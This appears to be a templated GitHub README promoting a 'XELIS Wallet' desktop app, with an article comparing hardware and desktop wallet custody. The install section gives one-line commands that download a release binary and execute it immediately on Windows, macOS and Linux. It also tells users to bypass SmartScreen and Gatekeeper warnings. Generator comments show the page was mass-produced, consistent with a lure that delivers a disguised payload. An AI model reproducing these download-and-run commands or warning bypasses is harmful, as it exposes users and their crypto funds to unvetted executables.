![Hardware wallet or XELIS Wallet: a custody comparison](assets/banner-article.png)
# Hardware wallet or XELIS Wallet: a custody comparison

Two threat models, one phrase problem, and no automatic winner.

## Downloads - Custody

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> Hardware protects the key from your computer. It does not protect the phrase from your house.

A hardware wallet keeps keys on a dedicated device and signs there. XELIS Wallet keeps keys in local encrypted storage and signs on your computer. Neither is automatically safer: hardware removes the general-purpose machine from signing, the desktop app removes a second device and its supply chain.

<!-- ARTICLE-BODY-BEGIN -->
## The two threat models

A desktop wallet assumes the computer can be compromised and encrypts the key file so a stolen copy is not immediately spendable. A hardware wallet assumes the computer is hostile and never lets the key leave the device, so a compromised machine can request a signature but not extract the key.

Both assume the owner has the phrase. Neither survives a phrase photographed into a synced photo library.

## What hardware fixes, and what it does not

Hardware removes the moment of exposure that matters most: the key existing in memory on an online machine. It does not remove the backup problem, the address-verification problem or the risk of approving a transaction you did not intend to sign.

The phrase is still the recovery route, so <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-seed-phrase-storage-mistakes.md">seed phrase storage mistakes</a> applies unchanged.

## What the desktop model demands

A desktop wallet needs a clean machine, a supported OS and a password that is not reused. Malware that reads the wallet's memory or keystrokes is the real threat, and no encryption in the file stops that once the app is unlocked.

In exchange, the setup is one download and no extra device. <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-self-custody-control.md">Self-custody in XELIS Wallet</a> describes the duties that come with that simplicity.

## Where this client stands on hardware

Hardware wallet integration for this desktop client is not documented in anything these pages can verify, so no compatibility list is published here. If you need hardware signing today, confirm support with the client's own release notes before buying a device for it.

That answer will disappoint people who want a specific device named, and inventing one would be worse. The comparison above stands regardless of which devices exist.

## Choosing between the models

Choose hardware when the threat you fear is malware on your daily machine and you will accept a second device and its supply chain. Choose the desktop wallet when you want one verified download from the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a>, a clean setup and a phrase you control, and you accept that the machine is part of the security boundary.

For the wider criteria, <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-private-wallet-basics.md">private wallet criteria</a> puts custody alongside confidentiality and platform.

## FAQ
### Should I use a hardware wallet or XELIS Wallet?
Hardware if malware on your computer is the threat you are addressing and you accept a second device. XELIS Wallet if you want one verified desktop install and a phrase you control.

### How secure are crypto wallets?
As secure as the machine, the phrase storage and the addresses you approve. Encryption protects a stolen file, not a compromised session.

### What is the safest most secure crypto wallet?
There is no such ranking. The safest option is the one whose failure mode you can manage, and both models fail through the phrase.

### Where can I store my Xelis coins?
In a self-custodial wallet whose phrase you hold, on a machine you control. A hardware device is one way to hold the keys; XELIS Wallet is another.

### Does XELIS Wallet work with Ledger or Tangem?
No integration is documented in anything these pages can verify, so treat support as unconfirmed and check the release notes before buying hardware for it.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [XELIS Wallet self-custody](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-self-custody-control.md)
- [Seed phrase storage mistakes](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-seed-phrase-storage-mistakes.md)
- [Private wallet criteria](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-private-wallet-basics.md)
- [XELIS Wallet local data](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-password-encryption-local-data.md)
